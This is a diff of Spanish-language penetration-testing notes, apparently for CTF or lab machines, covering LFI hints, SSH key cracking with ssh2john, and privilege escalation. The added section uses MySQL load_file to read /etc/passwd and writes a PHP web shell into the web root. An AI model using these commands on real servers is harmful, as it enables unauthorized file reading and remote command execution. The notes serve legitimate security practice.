@@ -527,7 +527,8 @@ ssh -i id_rsa -p 2082 root@votenow.local
 
 ## Infovore
 
-- filtramos por **disable_functions** en el archivo info.php
+	- filtramos por **disable_functions** en el archivo **info.php**
+- Filtrar por user en **info.php**
 - Filtrar por file_uploads: **On** --> buscar en google para encontrar la vuln de **LFI**
 >Podemos ver que funciones o comandos están deshabilitados
 
@@ -567,9 +568,8 @@ hostname -I
 cat /proc/net/arp 
 arp -n
 ```
-ip a
-```
-- y encontramos en **~/** un archivo .oldkeys.tgz y lo descomprimimos, encontramos una clave ssh
+
+- Encontramos en **~/** un archivo .oldkeys.tgz y lo descomprimimos, encontramos una clave ssh
 - **ssh2john** se encarga de convertirla a hash
 ```bash
 ssh2john id_rsa > hash
@@ -613,3 +613,16 @@ bash -p
 ```
 
 
+## Máquinas varias
+
+#### Intentando partir desde mysql
+```bash
+mysql> select load_file('/etc/passwd');
+mysql> select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php";
+
+# Leo lo que s epodía leer por el navegador, por aquí a ver is hay algo diferente
+mysql> select load_file('/var/www/html/index.html');
+
+# Veo que en uno d elos directorio si me lo deja subir
+mysql> select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html//M3t4LL1c@/shell.php";
+```
